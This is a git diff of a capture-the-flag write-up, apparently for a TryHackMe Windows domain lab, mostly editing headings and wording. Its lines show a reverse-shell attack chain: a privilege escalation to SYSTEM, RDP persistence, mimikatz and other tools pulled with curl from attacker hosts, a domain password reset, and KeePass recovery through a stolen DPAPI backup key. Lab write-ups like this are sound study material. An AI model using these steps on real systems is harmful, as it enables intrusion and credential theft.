@@ -1442,9 +1442,9 @@ Don't be fooled by the error, indeed you will get a shell:
                                        
 
 ## Notes
-For the last challenge we need to abuse DPAPI. This is the time to get back the exported PFX file, containing the back-ip key, we took from the RA domain controller. In case you missed it I suggest to go back 
+For the last challenge we need to abuse DPAPI. This is the time to get back the exported PFX file, containing the back-up key, we took from the RA domain controller. In case you missed it I suggest to go back 
 
-## Get a shell
+## Get initial shell
 Here we don't need to perform any service discovery, since we have a TFTP service active on the victim, plus we manage to plug-in a RubberDucky stick on  Charlotte Johnson laptop, so we can execute RubberDucky scripts against the machine. Since I don't know anything about RD scripts, it's time to learn something new :). To get a reverse shell I followed this [tutorial](https://shop.hak5.org/blogs/usb-rubber-ducky/the-3-second-reverse-shell-with-a-usb-rubber-ducky). So I created the following reverse shell:
 
     cat rs.ps1   
@@ -1512,6 +1512,7 @@ After a while I got a shell:
     whoami
     windcorp\alcrez
 
+## Privilege escalation
 Running 
 
     whoami /priv; whoami /groups
@@ -1653,7 +1654,7 @@ Inspecting copyprofile we can see that the last command copies  all the contents
  	Set shell = CreateObject("WScript.Shell")
 	shell.LogEvent 4, "Update VPN profile"
 
-Indeed if you execute it as the current user the copyprofile is executed (as a different user of course) and the content of C:\temp is copied over C:\Program Files\IVPN Client. Let's verify. If we create a file:
+Indeed if you execute it as the current user, the copyprofile is also executed (as a different user of course) and the content of C:\temp is copied over C:\Program Files\IVPN Client. Let's verify. If we create a file:
 	
 	PS C:\script> echo "......" > C:\temp\log001.txt
 	echo "......" > C:\temp\log001.txt
@@ -1752,6 +1753,7 @@ Then within 10 seconds restart the listener and you should get a shell as system
 	whoami
 	nt authority\system
 
+## Create persistence
 Enable RDP:
 
 	Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
@@ -1781,6 +1783,7 @@ Eventually follows the first access configuration required steps for support.it 
 
  	C:\Users\Public\support_tools> curl -O http://10.9.0.223:8000/mimikatz.exe
 
+## Take over Charlotte Johnson accout
 Execute mimikatz and set the appropriate permissions:
 
 	mimikatz # privilege::debug
@@ -1827,7 +1830,7 @@ Reset chajoh domain password (Note: don't specify the domain in the user value, 
 
 Take note of the ntlm password value since we will need it later.
 
-## Not able to access to RDP using chajoh
+### Not able to access to RDP using chajoh
 Now I  tried different strategies and commands to permit to chajoh to connect through RDP but I failed, so I decided to use this great windows feauture known as <b>runas</b>.
 
 
@@ -1841,6 +1844,7 @@ Check if we can get a shell as chajoh (here use the domain indeed)
 
  	C:\Windows\system32>whoami
 	windcorp\chajoh
+## Keepass attack
 Inspect keepas configuration:
 
 	C:\Windows\system32>type C:\Users\chajoh\AppData\Roaming\KeePass\KeePass.config.xml | findstr User
@@ -1856,7 +1860,9 @@ Inspect keepas configuration:
                                 <UserAccount>true</UserAccount>
                                 <DatabasePath>..\..\Users\chajoh\Documents\Database2.kdbx</DatabasePath>
                                 <UserAccount>true</UserAccount>
-Since user account is enabled we can try to recover the DB using the backed up DAPI key extracred from RA --> link here.
+Since user account is enabled we can try to recover the DB using the backed up DAPI key extracred from [RA](https://github.com/zinzloun/THM_WriteUP/tree/main/windcorp#optional-export-dpapi-domain-backup-key).
+
+<b>The following commands must be executed inside chajoh user's shell</b>.
 Let's first try to open Keepass as current user:
 
 	cd "C:\Program Files (x86)\KeePass Password Safe 2"
@@ -1867,8 +1873,9 @@ Let's first try to open Keepass as current user:
   	Failed to load the specified file.
    	The composite key is invalid.
     	...
-Since we changed the user password we invalidate here DPAPI key. This is the reasono why we tooked a backup from the server, since the backed up DPAPI key is used in these cases, to restore the user's one. 
-Download the certificate to Osiris:
+Since we changed the user password we invalidate here DPAPI key. This is the reasono why we tooked a backup from the server, since the backed up DPAPI key is used in these cases, to restore the user's one. We need to recreate the master key used by Keepass. To better understand what we want accomplish I suggest to read the following resource: https://sourceforge.net/p/keepass/wiki/Recover%20Windows%20User%20Account%20Credentials 
+
+Download the backed-up key file to Osiris:
 
 	C:\Users\Public\support_tools>curl -O http://10.9.1.47:8000/ra-dpapi-bk.pfx
 
@@ -1876,10 +1883,9 @@ Download the certificate to Osiris:
 
   	C:\Users\Public\support_tools>curl -O http://10.9.1.47:8000/CQMasterKeyAD.exe
 
-And one to search for DAPI master key:
+And one more to search for DAPI master key:
 
 	C:\Users\Public\support_tools>curl -O http://10.9.1.47:8000/CQDPAPIBlobSearcher.exe
-
 We start using this tool to find the current chajoh DPAPI keys used by Keepass:
 
 	C:\Users\Public\support_tools>CQDPAPIBlobSearcher.exe -d="C:\Users\chajoh\AppData\Roaming" -r -o C:\Users\chajoh\blobdata
@@ -1897,9 +1903,9 @@ We start using this tool to find the current chajoh DPAPI keys used by Keepass:
 	EC 6A 9A B8 A6 98 93 DB 8A F8 6F 1B 17 E7 02 25   .j........o....%
 	64 95 95 8B CD 2C CD DB                           d....,..
 	...
-We are intersted in the <b>mkguid as found in c:\users\chajoh\appdata\roaming\keepass\protecteduserkey.bin</b>. Take notes of this value since we will use it to build the users master key DPAPI path, in the related command. 
+We are intersted in the <b>mkguid as found in c:\users\chajoh\appdata\roaming\keepass\protecteduserkey.bin</b>. Take notes of this value, since we will use it to build the users master key DPAPI path, in the related command. As said the value refers to the DPAPI master key of the users. More informations can be found here: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4692
 
-Now let's have a look at the parameters needed to regenerate a new  master DPAPI key for chajoh.
+Now let's have a look at the parameters needed to regenerate a new master DPAPI key for chajoh, using the backup taken from the domain controller:
 
   	C:\Users\chajoh>C:\Users\Public\support_tools\CQMasterKeyAD.exe
 	CQMasterKeyAD by Michal Grzegorzewski, mgrzeg@cqure.pl
@@ -1917,11 +1923,12 @@ Now let's have a look at the parameters needed to regenerate a new  master DPAPI
 So the whole command is:
 
 	C:\Users\Public\support_tools>CQMasterKeyAD.exe --pfx="C:\Users\Public\support_tools\ra-dpapi-bk.pfx" --file="C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" --newhash=91b52a266727bbe24146d5059bbd879d
+ 
 	New masterkey file successfully written to: C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified
 	Now swap the old masterkey file with the new one and set the system and hidden attributes, see example:
 	attrib "C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H
 	
-Now switch to powershell and proceed to rename swap the old key with the newly created:
+Now switch to powershell and proceed to swap the old key with the newly created:
 
 	cd C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125
 	PS C:\Users\chajoh\AppData\Roaming\Microsoft\Protect\S-1-5-21-555431066-3599073733-176599750-1125> ls -force
@@ -1962,7 +1969,7 @@ Now we should be able to open the Keepass DB:
 
 	C:\Program Files (x86)\KeePass Password Safe 2>KeePass.exe
 
-## Additional note. 
+## Trouble shooting
 In case you find that the Keepass master key value is different from:
 
 	c:\users\chajoh\appdata\roaming\keepass\protecteduserkey.bin
